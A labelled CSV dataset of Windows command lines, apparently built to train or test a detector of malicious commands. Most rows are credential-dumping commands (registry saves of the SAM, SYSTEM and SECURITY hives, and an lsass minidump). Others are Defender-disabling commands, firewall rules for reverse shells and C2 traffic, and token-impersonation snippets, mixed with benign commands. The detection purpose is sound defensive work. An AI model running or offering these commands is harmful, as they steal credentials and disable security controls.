text,label
"cmd.exe /c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\system c:\windows\temp\40kxn58p.save,1
reg save hklm\sam c:\windows\temp\115i159k.save,1
reg save hklm\system c:\windows\temp\oj2njyd0.save,1
reg export hklm\sam c:\windows\temp\56mfm86x.save,1
"cmd.exe /c ""java -jar application.jar""",0
reg export hklm\system c:\windows\temp\8k4ezlo3.save,1
reg save hklm\security c:\windows\temp\01khb0yj.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\8hj03qh0.dat""",1
reg export hklm\system c:\windows\temp\ra11cav9.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\d8thsboh.dat""",1
reg save hklm\security c:\windows\temp\17orjlm9.save,1
reg export hklm\system c:\windows\temp\k1kl4ji9.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\gesz1d0k.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\system c:\windows\temp\2jm9pn0w.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\6q9qoy76.dat""",1
reg save hklm\system c:\windows\temp\iqw13gks.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7e8nv1lt.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hdouzgrh.dat""",1
reg  save  hklm\security  c:\windows\temp\3ilcekw7.save,1
reg export hklm\system c:\windows\temp\v5r6vzos.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\gjq1x3qj.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\39fppu17.dat""",1
reg export hklm\system c:\windows\temp\vnfu8wwl.save,1
reg   query   hkcu\console,0
"cmd.exe /c ""reg export hklm\sam c:\temp\yg10p63h.dat""",1
reg save hklm\system c:\windows\temp\aicnustf.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\l0phig6z.dat""",1
reg save hklm\security c:\windows\temp\kc9bar7w.save,1
"rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full",1
reg export hklm\sam c:\windows\temp\9a1cdfgd.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ysnz1gw5.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\rysgxrk0.dat""",1
reg query hkcu\console,0
reg save hklm\system c:\windows\temp\n3svzevz.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\2c40f7r1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\wr4jk88o.dat""",1
reg save hklm\sam c:\windows\temp\pcw9537t.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\d1rzxg5x.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\1ynomys4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7q8irv3b.dat""",1
reg export hklm\security c:\windows\temp\9odrk7kd.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\w69u1mbq.dat""",1
reg   save   hklm\security   c:\windows\temp\n95ghb6q.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8gguxq6p.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\g59errr3.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\c5mntz9m.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\j3oirmnk.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ks64wkvs.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0jzj7g3n.dat""",1
reg  export  hklm\system  c:\windows\temp\ww6xwjzv.save,1
reg export hklm\system c:\windows\temp\j9e7lyd4.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\scq3avw3.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\navvof56.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zw8ycky4.dat""",1
reg save hklm\sam c:\windows\temp\aa7ngh0f.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\myijnzuj.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\2osjng70.dat""",1
"powershell -nop -c ""wmic product get name, version""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\t0imfub8.dat""",1
"powershell -nop -c ""ipconfig   /all""",0
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"cmd.exe /c ""get-help   adjusttokenprivileges   -full""",0
"cmd.exe /c ""reg save hklm\security c:\temp\sbo26n5w.dat""",1
reg export hklm\security c:\windows\temp\2yjx3p4c.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fu1g1n8b.dat""",1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\tys31t11.save""",1
"cmd.exe /c ""reg export hklm\security c:\temp\u6jngth9.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\5o7htpsy.dat""",1
reg save hklm\sam c:\windows\temp\drk6ct0a.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\at9cbdtw.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\0g0e5ge8.dat""",1
reg  save  hklm\sam  c:\windows\temp\iozt5zt5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\0smmwotl.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\y9bv4ag3.dat""",1
reg export hklm\sam c:\windows\temp\i2drewdv.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\v5djxxl0.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hmvj3kyw.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\v84i7r27.dat""",1
reg export hklm\security c:\windows\temp\60qee3xa.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\uxq7oyhb.dat""",1
reg save hklm\security c:\windows\temp\qza7qh5y.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\c119a0v5.dat""",1
reg save hklm\system c:\windows\temp\ls6afj16.save,1
reg export hklm\system c:\windows\temp\raiw533s.save,1
reg export hklm\sam c:\windows\temp\57ln3q1u.save,1
reg save hklm\system c:\windows\temp\ljuelt6c.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\9n7ro2ym.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\ba1es8m8.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\gj7su1sf.dat""",1
reg save hklm\sam c:\windows\temp\iybp8v10.save,1
"[dllimport(""advapi32.dll"")]   extern   bool   impersonateloggedonuser(...)",3
"powershell -nop -c ""reg save hklm\sam c:\temp\juj2h8fy.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\modh1ibn.dat""",1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
reg save hklm\security c:\windows\temp\28poq2up.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\aisqyck6.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\h9o3j5yz.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\c1tfldgh.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\i9sm7ve5.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\yay35xeg.dat""",1
reg save hklm\security c:\windows\temp\ztiot2zt.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\bhfp8tye.save""",1
reg export hklm\security c:\windows\temp\yaxhhhci.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\492inj1a.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\7epksq4q.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\punc8wa2.dat""",1
reg export hklm\system c:\windows\temp\keb3rcse.save,1
reg   export   hklm\system   c:\windows\temp\mp950mah.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8slftayw.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
"cmd.exe /c ""reg export hklm\sam c:\temp\ghw8774v.dat""",1
"cmd.exe /c ""klist  purge""",3
reg save hklm\system c:\windows\temp\8vejm8v4.save,1
reg save hklm\security c:\windows\temp\vg5a5292.save,1
reg save hklm\sam c:\windows\temp\nri5k9dk.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\1exuopwr.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\frcmenao.dat""",1
reg   export   hklm\security   c:\windows\temp\5auuivi2.save,1
"cmd.exe /c ""netsh  dump  >  netconfig.txt""",0
reg export hklm\sam c:\windows\temp\xvxjadxd.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\zkdkmjir.save""",1
reg export hklm\system c:\windows\temp\w7dtjgws.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\ny35u9lw.dat""",1
reg export hklm\sam c:\windows\temp\oii62nyw.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\security  c:\temp\ltfsqr55.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\84tq3fkv.dat""",1
reg   save   hklm\security   c:\windows\temp\ge2uhf9v.save,1
reg export hklm\system c:\windows\temp\9dzbgki4.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\6kg6tmug.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\itqzcyi0.dat""",1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\8oc0t2f8.save""",1
reg save hklm\sam c:\windows\temp\tamp8zvz.save,1
reg export hklm\system c:\windows\temp\asah4jeg.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\vnx4a8wt.save""",1
reg save hklm\security c:\windows\temp\gocaiubg.save,1
reg save hklm\system c:\windows\temp\76rsrh2x.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg export hklm\security c:\temp\xlbjri3a.dat""",1
reg save hklm\sam c:\windows\temp\tsd6rdjk.save,1
reg save hklm\system c:\windows\temp\oqusal7z.save,1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg save hklm\sam c:\windows\temp\i0h6frq1.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ru8kc3vc.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\u5sqbem0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\z4zbnhf5.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\yt6syzp0.dat""",1
reg save hklm\system c:\windows\temp\mha8n1l7.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\sam c:\windows\temp\fdvovq5k.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\hysd0n3m.dat""",1
reg save hklm\security c:\windows\temp\edseb7wo.save,1
reg save hklm\system c:\windows\temp\nc28aweq.save,1
reg save hklm\sam c:\windows\temp\4pgsb9fl.save,1
reg export hklm\sam c:\windows\temp\l3kiga63.save,1
reg save hklm\sam c:\windows\temp\w16qlohi.save,1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\7or4rjcm.dat""""",1
reg export hklm\security c:\windows\temp\l43dxlbs.save,1
reg save hklm\sam c:\windows\temp\cx9a0jbq.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\bth2uqpj.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\5u6gtjdd.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\nxe7yf8m.dat""",1
reg export hklm\security c:\windows\temp\iqxm01xo.save,1
"cmd.exe /c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""select-string   -path   c:\logs\app.log   -pattern   'failed   logon'""",0
"cmd.exe /c ""reg export hklm\security c:\temp\fds7256h.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\tnsxpdb9.dat""",1
reg export hklm\security c:\windows\temp\94gl4h3z.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\u6c2o3k9.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\3xr3fjd5.dat""",1
reg save hklm\sam c:\windows\temp\pjcodx1c.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\slz0gh4c.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\cn76c9sp.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\yom2z0o5.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\969ikn2f.dat""",1
reg export hklm\system c:\windows\temp\lds57lv6.save,1
reg save hklm\system c:\windows\temp\pvp5jiq2.save,1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\abyntbos.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\fzeh57kh.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\6l8q643p.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\3l5q8ojv.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\250xwrs7.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hqkn3a63.dat""",1
reg export hklm\security c:\windows\temp\3uwdl8jq.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\q2gy42jt.dat""",1
reg  save  hklm\security  c:\windows\temp\qvyr6mn9.save,1
reg export hklm\sam c:\windows\temp\i7f3vmt6.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\rfaikj6s.dat""",1
reg export hklm\system c:\windows\temp\uype5gw2.save,1
reg export hklm\sam c:\windows\temp\sxoa5su0.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\m3gz70gb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ugajm0r6.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hrqyfj3l.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\lq7v9rxb.dat""",1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337,2
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\2eh50wv3.save""",1
reg export hklm\sam c:\windows\temp\u24grdb2.save,1
reg export hklm\sam c:\windows\temp\k543m8pv.save,1
reg export hklm\sam c:\windows\temp\frqb0vya.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\940lnrml.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\lu81uhkz.dat""",1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg export hklm\security c:\windows\temp\5oo053f3.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\3davuyws.save""",1
python  -m  http.server  8080,0
reg export hklm\security c:\windows\temp\u4db2448.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\m3q483kx.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\nuun84ol.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\pdxzmufh.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\pfl4evlr.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)""",3
"cmd.exe /c ""reg save hklm\security c:\temp\bxwt8vaz.dat""",1
reg save hklm\system c:\windows\temp\c7rygadj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\8kr4dutz.dat""",1
reg export hklm\system c:\windows\temp\60h1eqfy.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\8j4q57ol.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4nso2cpk.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\klkp9h4y.dat""",1
reg save hklm\security c:\windows\temp\w7i80leg.save,1
reg save hklm\security c:\windows\temp\2px95x8p.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\eg0jyo6v.dat""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\rm5ybeks.save""",1
reg save hklm\sam c:\windows\temp\67x8o3p7.save,1
reg save hklm\security c:\windows\temp\wkl964t6.save,1
rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\system c:\windows\temp\07p314ch.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\n1ukhlog.save""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\zqdwyqg4.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\c4qu8d2h.dat""",1
reg save hklm\sam c:\windows\temp\s76kdwzk.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\bm4xzs9v.dat""",1
reg save hklm\sam c:\windows\temp\mupcxm95.save,1
reg export hklm\sam c:\windows\temp\dezb06u3.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\l44jf8wq.dat""",1
reg save hklm\system c:\windows\temp\dzjct8x5.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\skrfprg8.dat""",1
reg save hklm\sam c:\windows\temp\e043fnfs.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\kngp76w5.dat""",1
reg save hklm\system c:\windows\temp\l78rok2c.save,1
reg export hklm\system c:\windows\temp\tqg8b5p8.save,1
reg save hklm\system c:\windows\temp\r143wmjr.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\abojc8gz.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\595k6yas.dat""""",1
reg export hklm\security c:\windows\temp\zm4kqh6i.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\zxt4wtib.dat""",1
reg save hklm\system c:\windows\temp\i5x8t8on.save,1
"cmd.exe /c ""powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\hrytdph0.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jzs7w4ft.dat""",1
reg export hklm\security c:\windows\temp\wdcqipqr.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\1ihsv2ao.dat""",1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\no4mslqr.dat""",1
reg save hklm\sam c:\windows\temp\8ujwymo5.save,1
reg save hklm\sam c:\windows\temp\fswxcsy9.save,1
reg export hklm\sam c:\windows\temp\9g4nvw0w.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\gfbaibnm.dat""",1
reg export hklm\sam c:\windows\temp\hc95ueih.save,1
reg export hklm\system c:\windows\temp\or8n1idr.save,1
"powershell -nop -c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 1337""",2
rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\sam c:\windows\temp\7vtyzbb2.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\xon5ry7q.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0orc3msj.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\wyov1ydh.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\1dzmcpvf.dat""",1
"cmd.exe /c ""java   -jar   application.jar""",0
reg export hklm\security c:\windows\temp\86e5n836.save,1
rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888,2
reg export hklm\sam c:\windows\temp\xqtqofx2.save,1
reg save hklm\security c:\windows\temp\8ra1xecc.save,1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\security c:\windows\temp\vqoo4wr7.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\9de1quuk.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\sa5alqq3.dat""""",1
reg save hklm\sam c:\windows\temp\w201a91b.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\hynkrqjw.dat""",1
reg   export   hklm\system   c:\windows\temp\x2d8g6s6.save,1
reg export hklm\security c:\windows\temp\hzha9b0g.save,1
reg save hklm\security c:\windows\temp\x70pb9zr.save,1
reg export hklm\security c:\windows\temp\k2ba3yo8.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\gpwzxabm.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\s7ze0m5l.dat""",1
reg export hklm\system c:\windows\temp\w2aaenh3.save,1
reg save hklm\security c:\windows\temp\8nrybp28.save,1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\system c:\windows\temp\yzj24d1y.save,1
reg save hklm\system c:\windows\temp\29b3ycg9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\loa40vz4.dat""",1
reg export hklm\security c:\windows\temp\151g81lj.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\sidanhup.dat""",1
reg save hklm\sam c:\windows\temp\30ztlu5e.save,1
reg   save   hklm\sam   c:\windows\temp\8igxsqfw.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\vpa6droy.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\ra2r2x00.dat""""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\k1ezqm5k.dat""",1
reg save hklm\sam c:\windows\temp\7l1rpbqn.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\e54mvy91.dat""",1
reg save hklm\security c:\windows\temp\kedu3630.save,1
reg  save  hklm\security  c:\windows\temp\wbunb8ik.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\hclkqfvu.dat""",1
set-mppreference   -disablerealtimemonitoring   $true,2
"powershell -nop -c ""reg export hklm\sam c:\temp\iy8o4ga6.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ljcvr80f.dat""",1
reg save hklm\sam c:\windows\temp\mpagfoec.save,1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\nhyvtcbe.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\rg6ruxzm.dat""",1
ping   8.8.8.8,0
reg save hklm\security c:\windows\temp\hzwte6jr.save,1
reg save hklm\sam c:\windows\temp\rcsw6g24.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\4mdd3tkk.dat""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\ss11vkmx.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\b3s80s4d.dat""",1
reg export hklm\system c:\windows\temp\95fzr8uz.save,1
reg save hklm\security c:\windows\temp\5oi9al7u.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\kjhon51f.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4jhxs2o9.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\abfcpi3n.dat""",1
"powershell -nop -c ""sc  stop  windefend""",2
reg save hklm\sam c:\windows\temp\wiwkj5yp.save,1
reg save hklm\security c:\windows\temp\ibb4iocv.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\0vg2j8mu.save,1
"powershell -nop -c ""ping 8.8.8.8""",0
reg save hklm\security c:\windows\temp\nx0rabb3.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\pif5xehy.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\w7gbi2fq.dat""",1
reg export hklm\system c:\windows\temp\wecwl5jo.save,1
reg save hklm\system c:\windows\temp\w6xtse6r.save,1
reg export hklm\system c:\windows\temp\m0u0fd6s.save,1
reg  export  hklm\system  c:\windows\temp\2hyan4ro.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7luorb42.dat""",1
reg export hklm\security c:\windows\temp\n0udi11w.save,1
"cmd.exe /c ""whoami   /groups""",0
reg save hklm\sam c:\windows\temp\3qofum15.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\kbr6w6a3.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\hjczfas0.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\z88mequw.dat""",1
reg export hklm\security c:\windows\temp\8su7g2hg.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: tcp 8888""",2
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""reg save hklm\sam c:\temp\4lm1ane4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\3z4gdcjg.dat""",1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\dmxkf2w6.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\z5c2gg9f.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\x1wsr9p5.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\ydz5i7um.dat""""",1
"powershell -nop -c ""reg export hklm\security c:\temp\83edqrb9.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\5f41xfdc.save""",1
reg save hklm\security c:\windows\temp\nw33jnj7.save,1
reg save hklm\security c:\windows\temp\6ejra68n.save,1
reg save hklm\system c:\windows\temp\xnga2kwj.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rxk0j2iy.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fpncw7xo.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4of7xe4x.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\l84b7c1g.dat""",1
reg export hklm\security c:\windows\temp\sac5wtcn.save,1
reg save hklm\system c:\windows\temp\owmmy0p2.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\t0w4utp4.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\p9jt775q.dat""",1
reg save hklm\security c:\windows\temp\fmix37xr.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\tccv6x0r.dat""",1
reg export hklm\system c:\windows\temp\dyw1ykcr.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\mk7899qt.dat""",1
reg export hklm\security c:\windows\temp\q8esnknd.save,1
reg export hklm\sam c:\windows\temp\3e5dp9u3.save,1
reg save hklm\system c:\windows\temp\rqtw7zqp.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\n4jwmzi2.dat""""",1
reg export hklm\system c:\windows\temp\xc7lbfiu.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\2dueuktv.dat""",1
reg export hklm\sam c:\windows\temp\t8m46tf7.save,1
reg save hklm\system c:\windows\temp\zudh1yda.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\czj0rx2l.dat""",1
